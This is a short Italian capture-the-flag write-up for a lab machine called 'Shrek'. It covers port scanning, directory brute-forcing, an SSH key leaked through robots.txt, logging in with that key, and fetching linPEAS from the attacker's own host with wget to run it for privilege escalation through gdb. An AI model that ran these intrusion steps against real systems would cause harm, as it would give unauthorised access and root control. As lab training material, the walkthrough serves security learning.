# SHREK

iniziamo con uno scan della macchina per torvare le porte apere e i servizi che ci girano sopra

```bash
nmap shrek.thm -sV -sC 
```

troviamo varie porte aperte tra cui la porta 80 simbolo di una web application

```bash
http://shrek.thm/
```

nulla di interessante andiamo a vedere che cartelle contiene
```bash
gobuster dir -u http://shrek.thm/ -w /usr/share/wordlist/dirbuster/common.txt
```

abbiamo trovato robots.txt andiamo a vedere cosa contiene

```bash
http://shrek.thm/robots.txt
```

ecco un id_rsa copiamola e salviamola sulla nostra macchina con il nome di id_rsa

```bash
nano id_rsa
chmod 600 id_rsa
```

entriamo in shh

## SSH

```bash
ssh -i id_rsa shrek@shrek.thm
```
## PRIVILEGE ESCALATION

portiamo linPEAS.sh sulla macchina (scaricatevelo prima!!)
sulla nostra macchina apriamo un http dove si trova lo script
```bash
python -m http.server 80
```

successivamente andiamo a prendere il file
```bash
wget http://nostroip/linPEAS.sh
```

diamogli i giusti permessi 
```bash
chmod +x linPEAS.sh
./linPEAS.sh
```

troviamo un vulnerabilità a livello gdb e tramite GTFO.BINS vedete che comando eseguire per il privesc
